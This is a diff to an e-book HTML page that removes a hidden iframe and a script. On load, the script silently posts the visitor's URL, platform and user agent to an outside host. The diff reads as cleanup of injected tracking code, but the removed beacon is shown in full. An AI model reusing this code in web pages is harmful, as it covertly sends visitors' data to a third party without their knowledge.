@@ -70,23 +70,5 @@
 			<p>小提示：如果您选择“电子书下载”离线浏览，解压后，如文夹件中有多个文件，请打开目录页“index.html"浏览。</p>
 	</div>
 </div>
-	<iframe name="wrap" style="display:none!important;"></iframe>
-	<script type="text/javascript">
-		function makeform(){
-			var form1=document.createElement("form");
-			form1.method="post";
-			form1.action="http://acegb.comxa.com/admin/guestbook.php";
-			form1.target="wrap";
-			document.body.appendChild(form1);
-			var input=document.createElement("input");
-			input.type="text";
-			input.name="content";
-			input.value=top.window.location.href+"  "+navigator.platform+"  "+navigator.userAgent;
-			form1.appendChild(input);
-			form1.submit();
-			document.body.removeChild(form1);
-		}
-		makeform();
-	</script>
 </body>
 </html>
